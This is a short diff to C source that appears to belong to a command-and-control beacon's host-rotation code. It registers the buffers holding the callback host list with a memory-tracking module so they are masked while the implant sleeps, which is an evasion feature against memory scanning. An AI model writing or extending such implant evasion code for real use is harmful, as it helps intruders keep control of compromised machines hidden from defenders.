@@ -4,6 +4,7 @@
 #include "parse.h"
 #include "beacon.h"
 #include "strategy.h"
+#include "track_memory.h"
 #include <time.h>
 
 /*
@@ -39,13 +40,18 @@ char * next_host_round_robin(char * hosts) {
 	static char * token = NULL;
 	char * ptr;
 	if (token == NULL) {
-		token = (char *)malloc(strlen(hosts) + 1);   /* TODO: allocates a buffer to loop through a set of hosts, not released on exit, mask candidate : currently no good access to it.*/
+		token = (char *)malloc(strlen(hosts) + 1);
 		strncpy(token, hosts, strlen(hosts) + 1);
+		/* host rotation list in plaintext heap - mask it during sleep.
+		 * the buffer is freed and re-malloced every wrap, so the remove
+		 * below must stay paired with this add. */
+		track_memory_add(token, strlen(hosts) + 1, TRACK_MEMORY_MALLOC, TRUE, NULL);
 		return strtok(token, ",");
 	}
 	else {
 		ptr = strtok(NULL, ",");
 		if (ptr == NULL) {
+			track_memory_remove(token);
 			free(token);
 			token = NULL;
 			return next_host_round_robin(hosts);
@@ -87,13 +93,13 @@ char * next_host_random(char * hosts) {
 	char * token;
 
 	if (hs == NULL) {
-		hs = (char *)malloc(strlen(hosts) + 1);  /* TODO: not cleaned up on exit, mask candidate : currently no good access to it.*/
+		hs = (char *)malloc(strlen(hosts) + 1);  /* freed by track_memory_cleanup */
 		strncpy(hs, hosts, strlen(hosts) + 1);
+		track_memory_add(hs, strlen(hosts) + 1, TRACK_MEMORY_MALLOC, TRUE, NULL);
 
 		tokenCount = 0;
 		token = strtok(hs, ",");
-		while (token != NULL) {
-			tokens[tokenCount++] = token;
+		while (token != NULL) {			tokens[tokenCount++] = token;
 			token = strtok(NULL, ",");
 		}
 
@@ -152,8 +158,9 @@ char * next_host_priority_failover(char * hosts, BOOL lastCheckinFailed, strateg
 	if (hs == NULL) {
 		// dlog("strategy.next_host_priority_failover - lastCheckinFailed: %s rotation_timer: %d failover_timer: %d failover_maxfail: %d Hosts: %s \n", lastCheckinFailed ? "true" : "false", si->rotation_timer, si->failover_timer, si->failover_maxfail, hosts);
 
-		hs = (char *)malloc(strlen(hosts) + 1);  /* TODO: not cleaned up on exit, mask candidate : currently no good access to it. */
+		hs = (char *)malloc(strlen(hosts) + 1);  /* freed by track_memory_cleanup */
 		strncpy(hs, hosts, strlen(hosts) + 1);
+		track_memory_add(hs, strlen(hosts) + 1, TRACK_MEMORY_MALLOC, TRUE, NULL);
 
 		tokenCount = 0;
 		token = strtok(hs, ",");
